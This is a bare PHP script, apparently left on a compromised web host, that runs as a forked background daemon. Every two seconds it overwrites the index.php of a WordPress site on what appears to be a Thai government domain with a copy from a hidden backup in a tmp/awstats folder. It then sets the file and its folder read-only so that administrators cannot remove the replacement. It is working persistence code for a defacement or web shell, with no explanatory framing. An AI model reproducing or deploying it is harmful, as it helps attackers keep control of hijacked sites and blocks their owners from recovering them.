<?php
$indexFile = "/home/cp265900/public_html/thamaunglocal.go.th/wordpress/index.php";
$backupFile = "/home/cp265900/tmp/awstats/maw3six.txt";
$protectedFolder = dirname($indexFile);

$pidFile = "/tmp/protect_daemon.pid";
if (file_exists($pidFile)) {
    $pid = file_get_contents($pidFile);
    if (posix_getpgid($pid)) {
        die();
    } else {
        unlink($pidFile);
    }
}

$pid = pcntl_fork();
if ($pid > 0) {
    file_put_contents($pidFile, $pid);
    exit();
}

posix_setsid();

while (true) {
    if (!is_dir($protectedFolder)) {
        mkdir($protectedFolder, 0755, true);
    }

    if (!file_exists($indexFile)) {
        copy($backupFile, $indexFile);
    } else {
        if (md5_file($indexFile) !== md5_file($backupFile)) {
            copy($backupFile, $indexFile);
        }
    }

    chmod($indexFile, 0444);
    chmod($protectedFolder, 0555);

    sleep(2);
}
?>
